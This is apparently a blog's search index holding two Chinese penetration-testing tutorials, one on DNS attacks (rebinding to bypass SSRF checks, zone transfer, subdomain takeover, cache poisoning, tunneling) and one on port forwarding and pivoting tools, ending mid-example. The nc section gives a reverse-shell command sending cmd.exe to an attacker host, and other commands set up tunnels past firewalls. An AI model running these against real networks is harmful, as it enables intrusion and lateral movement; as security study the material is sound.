<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>常见的DNS攻击手段</title>
      <link href="/2018/12/23/%E5%B8%B8%E8%A7%81%E7%9A%84DNS%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5/"/>
      <url>/2018/12/23/%E5%B8%B8%E8%A7%81%E7%9A%84DNS%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5/</url>
      
        <content type="html"><![CDATA[<p><img style="margin: auto;" src="/myimages/常见的DNS攻击手段/index.png" height="450" width="450"></p><blockquote><p>DNS记录往往展示了一个公司或者企业的整个网络拓扑结构，所以一些针对DNS的攻击往往会给渗透测试带来意料之外的惊喜。加速对渗透对象的网络拓扑理解，有利于利用对象网络的薄弱环节，甚至对后渗透阶段带来意想不到的收益。</p></blockquote><a id="more"></a><h1 id="对DNS的攻击手段"><a href="#对DNS的攻击手段" class="headerlink" title="对DNS的攻击手段"></a>对DNS的攻击手段</h1><p>在理解DNS相关的攻击方式之前，对DNS相关知识还是比较有必要的，推荐去看下参考文献第四个链接，作为DNS的前置科普，可以让我们比较快速入门，当然最好是自己去实现搭建一下域名服务器，特别是主从域名服务器，这样会让我们对DNS有更深入的理解，配置主从服务器可以参考一下参考链接【5】。<br>接下来说一下笔者了解到的一些攻击或者说利用方式，DNS域传送，子域名劫持，DNS缓存毒化，DNS劫持，DNS 重绑定,DNS ddos，DNS tunneling……</p><h1 id="DNS-重绑定"><a href="#DNS-重绑定" class="headerlink" title="DNS 重绑定"></a>DNS 重绑定</h1><p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</span><br><span class="line"></span><br><span class="line">(2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证</span><br><span class="line"></span><br><span class="line">(3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</span><br><span class="line"></span><br><span class="line">(4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果。</span><br></pre></td></tr></table></figure></p><p>DNS重绑定主要用在ssrf绕过ip检测这样或者类似的场景，它可以给我们提供一个绕过正则，让服务器访问内部网络的目的。</p><h1 id="DNS-域传送"><a href="#DNS-域传送" class="headerlink" title="DNS 域传送"></a>DNS 域传送</h1><p>所谓的DNS域传送，其实是在主从DNS服务器架构下的一种漏洞。它的原理其实相当简单，在在部署主从服务器的时候，从属服务器一般都需要向主服务器查询同步数据信息，在DNS中就是更新同步记录表。既然要同步记录表，那么自然主服务器需要把从服务器的查询结果如实给出。那么在<code>qurry_allow</code>的设置上如果弄成<code>any</code>,毫无疑问将会泄露整个网站的ip拓扑，给渗透利用带来方便。</p><h1 id="DNS子域名劫持"><a href="#DNS子域名劫持" class="headerlink" title="DNS子域名劫持"></a>DNS子域名劫持</h1><p>所谓的DNS子域名劫持，指的就是域名服务其下有一个子域名使用了第三方的云服务，业务到期了，准确的说是废用了，但是在企业内部的DNS记录上还有相关记录，这里的记录主要是CNAME方式，这样一来，我们可以去相关云服务商申请相关的服务，来填补企业DNS空缺的CNAME记录，这样一来，我们就成功的接管了公司旗下一个废除的子域名。有了这个子域名的控制权，我们用来绕过浏览器CSP策略，或者进行钓鱼等相关活动。危害还是相当大的。但是注意到这种利用方式不是百发百中，因为有些云服务商是不允许你修改其服务的URI的，这样一来，我们就无法申请一个相同的URI，使其指向之前的DNS CNAME记录。</p><h1 id="DNS-欺骗（DNS-投毒）"><a href="#DNS-欺骗（DNS-投毒）" class="headerlink" title="DNS 欺骗（DNS 投毒）"></a>DNS 欺骗（DNS 投毒）</h1><p>DNS存在缓存机制，DNS缓存大致有两种：本地缓存，DNS服务器多级缓存。注意到一般情况下我们欺骗的是本地缓存，因为本地缓存的欺骗成本比较低，而且比较可控，一打一个准。DNS服务器缓存一般是指我们控制了一个域下的DNS服务器，那么我们可以所有以这台服务器作为首次查询的用户都被缓存投毒。下面主要说一下本地DNS缓存投毒。我们可以通过本地DNS缓存投毒，去进行钓鱼(Ettercap)，远程访问的持久化（BeEF）,投放广告，等等。本地DNS投毒有两种方向：1.直接操作系统层面的缓存，如中间人劫持（参考这篇文章：<a href="http://r00tshell.lofter.com/post/3d2f21_18839d8）；2.利用好浏览器缓存。（其实二者殊途同归，最后都是到系统级缓存，浏览器缓存算是系统缓存的一个子集）。浏览器缓存控制机制有两种：HTML" target="_blank" rel="noopener">http://r00tshell.lofter.com/post/3d2f21_18839d8）；2.利用好浏览器缓存。（其实二者殊途同归，最后都是到系统级缓存，浏览器缓存算是系统缓存的一个子集）。浏览器缓存控制机制有两种：HTML</a> Meta标签 以及HTTP头信息，通常，web开发者可以在HTML页面的<head><meta name="generator" content="Hexo 3.8.0">节点中加入<meta>标签。在BeEF里面有一套自动化的利用方式。当然也有其他的工具可以使用。只不过浏览器攻击工具首推BeEF。</head></p><h1 id="DNS-ddos"><a href="#DNS-ddos" class="headerlink" title="DNS ddos"></a>DNS ddos</h1><p>这个攻击方式估计是最最直白的攻击手段了，直接泛洪ddos，让DNS服务器拒绝服务，可以说是相当的简单粗暴。有篇安全牛的文章对这类攻击的防御手段给出了建议：<a href="https://www.aqniu.com/learn/14769.html" target="_blank" rel="noopener">https://www.aqniu.com/learn/14769.html</a></p><h1 id="DNS-tunnel"><a href="#DNS-tunnel" class="headerlink" title="DNS tunnel"></a>DNS tunnel</h1><p>这里不算是个漏洞，只能说是一个企业边界规则指定不合理造成的。因为一般内网向外的UDP 53端口流量是进行DNS查询的，出于正常的业务逻辑，这里应该不会存在安全隐患。但是DNS协议支持较大的载荷，那么攻击者完全可以利用DNS协议来搭建DNS隧道，实现内网穿透。而且也有相当一部分成熟的工具可以实现自动化。常见的有dns2tcp，iodine等。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://www.sans.org/reading-room/whitepapers/dns/securing-dns-zone-transfer-868" target="_blank" rel="noopener">https://www.sans.org/reading-room/whitepapers/dns/securing-dns-zone-transfer-868</a><br>[2] <a href="https://security.stackexchange.com/questions/10452/dns-zone-transfer-attack" target="_blank" rel="noopener">https://security.stackexchange.com/questions/10452/dns-zone-transfer-attack</a><br>[3] <a href="https://www.alibabacloud.com/help/zh/faq-detail/37529.html" target="_blank" rel="noopener">https://www.alibabacloud.com/help/zh/faq-detail/37529.html</a><br>[4] <a href="http://www.ruanyifeng.com/blog/2016/06/dns.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/06/dns.html</a><br>[5] <a href="https://www.cnblogs.com/kevingrace/p/7060119.html" target="_blank" rel="noopener">https://www.cnblogs.com/kevingrace/p/7060119.html</a><br>[6] <a href="http://www.4hou.com/web/13129.html" target="_blank" rel="noopener">http://www.4hou.com/web/13129.html</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> DNS </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>内网渗透中的端口转发</title>
      <link href="/2018/12/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
      <url>/2018/12/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<blockquote><p>需要知道，在渗透的整个流程中，根据web应用或者开放的端口进行渗透，获取webshell只是渗透这门艺术的一小部分，在真实的错综复杂的企业环境中进行内网渗透，其实水很深，涉及内网穿透，端口转发，域渗透，提权等一系列的难题。所以这篇文章对内网渗透学习进行一些记录。在这过程中参考了很多前辈们的宝贵经验，我把这些链接进行了收集，放在参考文献部分。</p></blockquote><a id="more"></a><h1 id="转发，映射，代理"><a href="#转发，映射，代理" class="headerlink" title="转发，映射，代理"></a>转发，映射，代理</h1><p>这几个概念其实是比较难区分的，特别是和后面的内网穿透混在一起，在宏观上说，他们差别不大。但是究其本质还是存在不小的差别的。现在就先对这几个概念说一下我个人的理解：</p><ul><li>转发： 转发是渗透中一种手段，是将一个网络端口从一个网络节点转发到另一个节点的行为。结果是使一个外网用户经过一个NAT路由器到达在内网IP地址某个端口。有时候也被称为隧道。</li><li>映射： 映射也是渗透中的一种手段，端口映射就是将外网主机的IP地址的一个端口映射到内网中一台机器，提供相应的服务。其实很多时候转发和映射</li><li>代理： 代理是一种结果，以端口转发和映射为技术基础。代理在很多场合是用在连接互联网的web服务上面，起到突破ip封锁，隐匿身份等作用。其原理是动态的端口转发。只需要本机和代理间建立一个隧道，然后代理就可以根据本机发起的请求去动态的获取出链的地址与端口。</li><li>内网穿透： 内网穿透是目的，它使用的手段有包括端口转发和映射，或者直接使用代理这一结果。很多时候我们指的内网穿透场景是指攻击机与靶机处于处于不同的内网中，一些回弹shell之类的手段直接实现，因为IP地址无法相互建立连接。这个时候就需要使用一些内网穿透常见的工具。这些工具也是使用端口转发和映射或类似的方法来突破限制。</li></ul><table>  <thead>    <tr>      <th>工具名称</th>      <th>主要用途</th>      <th>平台</th>      <th>备注</th>    </tr>  </thead>  <tbody>    <tr>      <td>lcx</td>      <td>端口映射</td>      <td>Windows</td>      <td>只支持tcp协议的端口转发，非系统内置。linux下叫做可以实现端口转发和端口映射</td>    </tr>    <tr>      <td>netsh</td>      <td>端口映射</td>      <td>Windows</td>      <td>只支持tcp协议的端口转发，需要安装ipv6</td>    </tr>    <tr>      <td>rinetd</td>      <td>反向代理</td>      <td>Linux</td>      <td>非内置，需要自行安装</td>    </tr>    <tr>      <td>Earthworm</td>      <td>端口映射、Socks5代理</td>      <td>Linux、Windows、MacOS、Arm-Linux</td>      <td>非系统内置，可以十分方便的支持多级转发</td>    </tr>    <tr>      <td>frp</td>      <td>高性能的反向代理应用</td>      <td>go</td>      <td>基于反向代理，可以十分灵活的进行内网穿透，绕过防火墙</td>    </tr>    <tr>      <td>reGeorg</td>      <td>Socks5 代理</td>      <td>常见脚本语言</td>      <td>reGeorg利用webshell建立一个socks代理进行内网穿透，服务器必须支持aspx、php、jsp、js等web语言</td>    </tr>    <tr>      <td>Metasploit portfwd</td>      <td>端口映射</td>      <td>MSF -&gt; Metpreter会话</td>      <td>需要网络状况较好</td>    </tr>    <tr>      <td>socat</td>      <td>端口映射</td>      <td>Linux</td>      <td>可能需要安装</td>    </tr>    <tr>      <td>Metasploit-&gt;socks4a</td>      <td>反向代理</td>      <td>MSF -&gt; Metpreter会话</td>      <td>需要会话主机有外网代理IP</td>    </tr>    <tr>      <td>tunna</td>      <td>HTTP隧道</td>      <td>常见脚本语言</td>      <td>需脚本环境执行，并且不太稳定</td>    </tr>    <tr>      <td>localtuuel</td>      <td>内网公网映射</td>      <td>nodojs</td>      <td>和ngork一样可以实现内网到公网端口的映射</td>    </tr>    <tr>      <td>ngork</td>      <td>内网公网映射</td>      <td>go</td>      <td>可以选择自建服务器或则和使用工具自带的服务器</td>    </tr>    <tr>      <td>dns2tcp</td>      <td>DNS隧道</td>      <td>kaii内置</td>      <td>防火墙过滤内部tcp出站策略的情况下，走DNS隧道，，通过DNS流量中继TCP连接</td>    </tr>    <tr>      <td>Iodine</td>      <td>DNS隧道</td>      <td>linux</td>      <td>原理上和dns2tcp类似</td>    </tr>    <tr>      <td>icmpsh</td>      <td>ICMP隧道</td>      <td>需要root权限</td>      <td>需要禁止系统对icmp的相应，用工具来处理收发icmp包</td>    </tr>  </tbody></table><h1 id="系统内置的转发工具"><a href="#系统内置的转发工具" class="headerlink" title="系统内置的转发工具"></a>系统内置的转发工具</h1><h2 id="iptables-NAT功能"><a href="#iptables-NAT功能" class="headerlink" title="iptables NAT功能"></a>iptables NAT功能</h2><p>由于linux主机出于安全考虑，系统参数<code>/proc/sys/net/ipv4/ip_forward</code>默认为0，所以是禁止NAT功能的，我们可以通过以下两种你方式修改系统运行时的参数。</p><h3 id="临时方案"><a href="#临时方案" class="headerlink" title="临时方案"></a>临时方案</h3><p><code>echo 1 &gt;/proc/sys/net/ipv4/ip_forward</code></p><h3 id="长期方案"><a href="#长期方案" class="headerlink" title="长期方案"></a>长期方案</h3><p>运行<code>vi /etc/sysctl.conf</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 找到下面的值并将0改成1</span><br><span class="line"></span><br><span class="line">net.ipv4.ip_forward = 1</span><br></pre></td></tr></table></figure></p><p>运行<code>sysctl –p</code>，使改动立即生效 。</p><p>下面是一个转发的示例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 1.1.1.1是公网ip,192.168.2.2内网ip</span><br><span class="line">iptables -t nat -A PREROUTING  -p tcp -d 1.1.1.1 --dport 80 -j DNAT --to-destination 192.168.2.2:8080</span><br><span class="line"></span><br><span class="line">iptables -t nat -A POSTROUTING -p tcp -s 192.168.2.2 --sport 8080 -j SNAT --to-source 1.1.1.1</span><br><span class="line"></span><br><span class="line">service iptables save</span><br></pre></td></tr></table></figure></p><p>这样就会使得访问1.1.1.1：80 映射到了192.168.2.2：8080端口。注意到这里</p><h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 公网主机</span><br><span class="line">nc -lvp 4444</span><br><span class="line"></span><br><span class="line"># 内网机器</span><br><span class="line">nc -t -e cmd.exe 公网主机ip 4444</span><br></pre></td></tr></table></figure><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#本地端口转发:</span><br><span class="line">ssh -CfNg -L port1:127.0.0.1:port2 user@host </span><br><span class="line">参数： -L 本地网卡地址:本地端口:目标地址:目标端口</span><br><span class="line"></span><br><span class="line">#远程端口转发： </span><br><span class="line">ssh -CfNg -R port2:127.0.0.1:port1 user@hsst</span><br><span class="line">参数： -R 远程网卡地址:远程端口:目标地址:目标端口</span><br><span class="line"></span><br><span class="line">#动态端口转发</span><br><span class="line">ssh -D localhost:2000 root@103.59.22.17</span><br><span class="line">参数：-D 本地网卡地址:本地端口</span><br></pre></td></tr></table></figure><h2 id="netsh"><a href="#netsh" class="headerlink" title="netsh"></a>netsh</h2><p>netsh是windows下提供网络管理的命令行工具，它是一个交互式的shell,涉及到上下文的概念。我们在交互式下面进入相应的上下文，进行参数的设置。也可以直接下面这样非交互式的进行端口转发。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netsh  interface ipv6 install</span><br><span class="line">#转发</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=10.10.18.1 listenport=4455 connectaddress=10.10.12.1  connectport=8080</span><br><span class="line"></span><br><span class="line">#删除转发</span><br><span class="line">netsh interface portproxy delete v4tov4 listenaddress=&#123;B的IP&#125;  listenport=&#123;B的端口&#125;</span><br></pre></td></tr></table></figure></p><h1 id="非内置的端口转发工具"><a href="#非内置的端口转发工具" class="headerlink" title="非内置的端口转发工具"></a>非内置的端口转发工具</h1><h2 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h2><p>socat这个端口转发我们其实更常用在ssrf构造payload的时候本地抓包，因为socat有记录转发流的功能。将socat作为中介捕获我们构造的payload包，然后进行进一步的操作，如gopher协议的构造。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#安装</span><br><span class="line">yum install -y socat</span><br><span class="line">apt install -y socat </span><br><span class="line"></span><br><span class="line">#TCP </span><br><span class="line">nohup socat TCP4-LISTEN:10000,reuseaddr,fork TCP4:1.1.1.1:10000</span><br><span class="line"></span><br><span class="line">TCP4-LISTEN:10000  监听 ipv4 的 10000TCP 端口。 10000 改成你自己需要转发的端口</span><br><span class="line">fork TCP4:1.1.1.1:10000  转发到 1.1.1.1 的 10000 端口，根据需求修改自行修改 ip 和端口</span><br><span class="line">nohup 后台运行。可以把这个命令写到   /etc/rc.local 里面开机启动启动。</span><br><span class="line"></span><br><span class="line">#UDP</span><br><span class="line">nohup socat -T 600 UDP4-LISTEN:10000,reuseaddr,fork UDP4:1.1.1.1:10000</span><br></pre></td></tr></table></figure></p><h2 id="lcx-exe"><a href="#lcx-exe" class="headerlink" title="lcx.exe"></a>lcx.exe</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">lcx-&lt;listen|tran|slave&gt; &lt;option&gt; [-log logfile]</span><br><span class="line">[option:]</span><br><span class="line"></span><br><span class="line"> -listen &lt;监听端口&gt; &lt;转发端口&gt; </span><br><span class="line"></span><br><span class="line"> -tran&lt;监听端口&gt; &lt;目标地址&gt; &lt;目标端口&gt;</span><br><span class="line"></span><br><span class="line"> -slave &lt;目标主机&gt; &lt;目标端口&gt; &lt;本地主机&gt;&lt;本机端口&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">内网机器上执行：</span><br><span class="line">lcx.exe –slave 公网IP +端口 内网IP +端口</span><br><span class="line">例: </span><br><span class="line">lcx.exe –slave 192.168.43.142 51 192.168.43.137 3389</span><br><span class="line">公网上执行：</span><br><span class="line">Lcx.exe –listen 监听51端口，转发到公网机器的3389端口</span><br><span class="line">例: </span><br><span class="line">Lcx.exe –listen 51 3389</span><br></pre></td></tr></table></figure><h2 id="meterpreter-portfwd"><a href="#meterpreter-portfwd" class="headerlink" title="meterpreter portfwd"></a>meterpreter portfwd</h2><p>在MSF渗透框架里面内置了端口转发的命令，在回弹了shell的条件下可以直接使用，下面式相关参数解析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd -h</span><br><span class="line">Usage: portfwd [-h] [add | delete | list | flush] [args]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -L &lt;opt&gt;  转发: 本地监听地址  反向: 本地主机连接到某个地址</span><br><span class="line">    -R        表示正向反向端口</span><br><span class="line">    -h        帮助信息</span><br><span class="line">    -i &lt;opt&gt;  端口转发条目的索引与交互（请参阅“列表”命令）</span><br><span class="line">    -l &lt;opt&gt;  转发：本地端口收听  反向：本地端口连接</span><br><span class="line">    -p &lt;opt&gt;  转发：远程端口连接  反向：远程端口监听</span><br><span class="line">    -r &lt;opt&gt;  转发：连接到远程主机</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">例子:</span><br><span class="line">portfwd -L 127.0.0.1 -l 1212 -r 10.10.12.1 -p 3389  </span><br><span class="line"></span><br><span class="line">portfwd -R -L 10.10.18.1 -l 8080 -r 10.10.12.1 -p 8877</span><br></pre></td></tr></table></figure><h2 id="Rinetd"><a href="#Rinetd" class="headerlink" title="Rinetd"></a>Rinetd</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装，注意到centos没有其默认的软件源，需要手动导入；ubuntu的比较方便</span></span><br><span class="line"><span class="comment">#centos 32</span></span><br><span class="line">$ vim /etc/yum.repos.d/nux-misc.repo</span><br><span class="line">[nux-misc]</span><br><span class="line">name=Nux Misc</span><br><span class="line">baseurl=http://li.nux.ro/download/nux/misc/el6/i386/</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://li.nux.ro/download/nux/RPM-GPG-KEY-nux.ro</span><br><span class="line"></span><br><span class="line"><span class="comment">#centos 64</span></span><br><span class="line">$ vim  /etc/yum.repos.d/nux-misc.repo:</span><br><span class="line"></span><br><span class="line">[nux-misc]</span><br><span class="line">name=Nux Misc</span><br><span class="line">baseurl=http://li.nux.ro/download/nux/misc/el6/x86_64/</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://li.nux.ro/download/nux/RPM-GPG-KEY-nux.ro</span><br><span class="line"></span><br><span class="line">$ yum --enablerepo=nux-misc install rinetd</span><br><span class="line"></span><br><span class="line"><span class="comment"># ubuntu</span></span><br><span class="line">$ apt-get install rinetd</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置文件在/etc/rinetd.conf，配置参数格式</span></span><br><span class="line">[bindaddress] [bindport] [connectaddress] [connectport]</span><br><span class="line">绑定的地址    绑定的端口  连接的地址      连接的端口</span><br><span class="line"></span><br><span class="line">[Source Address] [Source Port] [Destination Address] [Destination Port]</span><br><span class="line">源地址            源端口         目的地址               目的端口</span><br><span class="line"></span><br><span class="line"><span class="comment">#举例</span></span><br><span class="line">$ vim /etc/rinetd.conf</span><br><span class="line"></span><br><span class="line">0.0.0.0 8080 172.19.94.3 8080</span><br><span class="line">0.0.0.0 2222 192.168.0.103 3389</span><br><span class="line">1.2.3.4 80 192.168.0.10 80</span><br><span class="line">allow *.*.*.*</span><br><span class="line">logfile /var/<span class="built_in">log</span>/rinetd.log</span><br><span class="line"></span><br><span class="line"><span class="comment">#解释</span></span><br><span class="line">0.0.0.0表示本机绑定所有可用地址</span><br><span class="line">将所有发往本机8080端口的请求转发到172.19.94.3的8080端口</span><br><span class="line">将所有发往本机2222端口的请求转发到192.168.0.103的3389端口</span><br><span class="line">将所有发往1.2.3.4的80端口请求转发到192.168.0.10的80端口</span><br><span class="line">allow设置允许访问的ip地址信息,*.*.*.*表示所有IP地址</span><br><span class="line">logfil设置打印的<span class="built_in">log</span>的位置</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line"><span class="comment">#脚本启动</span></span><br><span class="line">$ /etc/init.d/rinetd start</span><br><span class="line"></span><br><span class="line"><span class="comment">#二进制启动</span></span><br><span class="line">$ /usr/sbin/rinetd -c /etc/rinetd.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">#关闭（使用脚本，或则和pkill）</span></span><br><span class="line">$ /etc/init.d/rinetd stop</span><br></pre></td></tr></table></figure><h2 id="Tunna-与-reGeorg"><a href="#Tunna-与-reGeorg" class="headerlink" title="Tunna 与 reGeorg"></a>Tunna 与 reGeorg</h2><blockquote><p>这两个工具的使用都是比较简单，就不啰嗦了，在获取webshell后，我们可以通过http进行端口转发。直接给出两个项目地址，推荐使用reGeorg，Tunna不稳定。<a href="https://github.com/SECFORCE/Tunna" target="_blank" rel="noopener">Tunna工具地址</a><br>  <a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">reGeorg工具地址</a>。</p></blockquote><h3 id="Localtunnel与Gnork"><a href="#Localtunnel与Gnork" class="headerlink" title="Localtunnel与Gnork"></a>Localtunnel与Gnork</h3><p>这两个工具都可以将内网的端口映射到公网，然后访问公网的ip就类似于访问内网的端口。这两个工具可以提供自建服务或者使用它提供的服务器进行内网穿透。其实这类工具在实际渗透中不是很常用。更直接的场景是自己攻击机在内网，在进行相关回连操作的时候，需要目标机器可达，毕竟它们只是一级转发，而且操作麻烦。直接给出项目地址：</p><ul><li><a href="https://github.com/localtunnel/localtunnel" target="_blank" rel="noopener">https://github.com/localtunnel/localtunnel</a></li><li><a href="https://ngrok.com/" target="_blank" rel="noopener">https://ngrok.com/</a></li></ul><h3 id="EW"><a href="#EW" class="headerlink" title="EW"></a>EW</h3><blockquote><p>工具的地址： <a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="noopener">http://rootkiter.com/EarthWorm/</a>    </p></blockquote><p>这是个国产的打洞神器，因为其方便的多级转发，支持反向代理等特性，在内网渗透领域可是响当当的。这里重点对这个工具做下记录，真的太强大了！</p><p>该工具共有 6 种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）。下面针对官方的例子进行以下解释：</p><h4 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./ew -s ssocksd -l 1080</span><br></pre></td></tr></table></figure><p>开启机器的1080端口做正向代理，我们可以通过链接该机器的1080端口进行端口代理转发。一般的场景为：kali 通过proxychain 链接开启了正向代理的公网ip。</p><h4 id="反响代理"><a href="#反响代理" class="headerlink" title="反响代理"></a>反响代理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#公网ip主机A，ip假设为1.1.1.1</span><br><span class="line">./ew -s rcsocks -l 1080 -e 8888 </span><br><span class="line"></span><br><span class="line"># 目标机B</span><br><span class="line">./ew -s rssocks -d 1.1.1.1 -e 8888</span><br></pre></td></tr></table></figure><p>反向代理是目标机向我们发起链接请求，与正向代理是不一样的。当建立了链接后，它的代理流如下<code>Me&lt;---&gt;A&lt;---&gt;B</code>。即我只要连接A的1080端口就可以获得一条反向代理的隧道，与B建立连接。这种场景可以用来绕过入口策略严格但是出口策略松散的防火墙。</p><h4 id="多级转发"><a href="#多级转发" class="headerlink" title="多级转发"></a>多级转发</h4><p>在前面的两个场景中，我们看到了<code>rcsocks</code>,<code>`ssocksd</code>,<code>rssocks</code>这三个命令的使用。在多级转发中我们会见到另外三个命令的作用。他们就类似于中间件，负责隧道导流与串接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#命令使用举例：</span><br><span class="line"># lcx_listen 用在将本机的端口进行转发</span><br><span class="line">$ ./ew -s lcx_listen -l  1080   -e 8888</span><br><span class="line"># lcx_tran 将本机端口与目的ip地址的端口进行转发</span><br><span class="line">$ ./ew -s lcx_tran   -l  1080   -f 2.2.2.3 -g 9999</span><br><span class="line"># lcx_slave 作为奴隶，将本机直接可达的两个主机实体上的端口进行转发</span><br><span class="line">$ ./ew -s lcx_slave  -d 1.1.1.1 -e 8888    -f 2.2.2.3  -g  9999</span><br></pre></td></tr></table></figure><p>下面我们来看个实际渗透三级级联例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 